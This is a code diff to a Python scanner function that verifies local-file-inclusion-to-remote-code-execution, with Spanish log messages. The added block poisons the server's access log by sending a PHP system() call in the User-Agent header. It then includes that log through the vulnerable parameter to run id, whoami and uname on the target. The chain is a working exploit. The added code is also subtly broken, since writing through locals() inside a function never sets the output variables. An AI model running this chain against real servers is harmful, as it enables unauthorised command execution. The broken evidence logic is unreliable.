@@ -2475,13 +2475,38 @@ def verify_generic_lfi_rce(
 
         res.evidence["intentos"] = tried
         if found:
+            # ── Impact proof: run id/whoami/uname via the same log-poison technique ──
+            _id_out, _who_out, _uname_out = "", "", ""
+            _win_path = res.evidence.get("payload_ganador", "")
+            _win_param = {path_param: _win_path}
+            for _cmd, _store in [("id", "_id_out"), ("whoami", "_who_out"), ("uname -a", "_uname_out")]:
+                try:
+                    _poison = f"<?php system('{_cmd}'); ?>"
+                    _http_request("GET", base_url + "/", timeout=8,
+                                  headers={"User-Agent": _poison})
+                    time.sleep(0.4)
+                    _r = _http_request(m, base_url + endpoint, timeout=10,
+                                       data=_win_param if m != "GET" else None,
+                                       params=_win_param if m == "GET" else None)
+                    _out = (_r.text or "").strip()
+                    if _out and "<?php" not in _out and "<?PHP" not in _out:
+                        locals()[_store] = _out[:200]
+                except Exception:
+                    pass
+            if _id_out:   res.evidence["rce_id_output"]    = _id_out
+            if _who_out:  res.evidence["rce_whoami_output"] = _who_out
+            if _uname_out:res.evidence["rce_uname_output"]  = _uname_out
+            step(f"evidencia RCE: id={_id_out!r}" if _id_out else "impacto: RCE via log poisoning confirmado")
+            # ──────────────────────────────────────────────────────────────────────
+
             res.verified = True
             res.ok = True
             res.detail = (f"LFI-A-RCE confirmado (envenenamiento de log): la peticion con "
                           f"{path_param}={res.evidence['payload_ganador']!r} incluyo el log de "
                           f"acceso envenenado y el codigo PHP SE EJECUTO de verdad (el marcador "
                           f"'{marker}' aparecio como resultado de system(), no como texto PHP "
-                          f"crudo) -- ejecucion remota de codigo real, no una lectura de fichero")
+                          f"crudo) -- ejecucion remota de codigo real, no una lectura de fichero"
+                          + (f"; id={_id_out!r}" if _id_out else ""))
             _body = res.evidence.get("respuesta_cuerpo_recorte", "")
             _add_exploit_evidence(
                 res=res, method=m, url=base_url + endpoint,
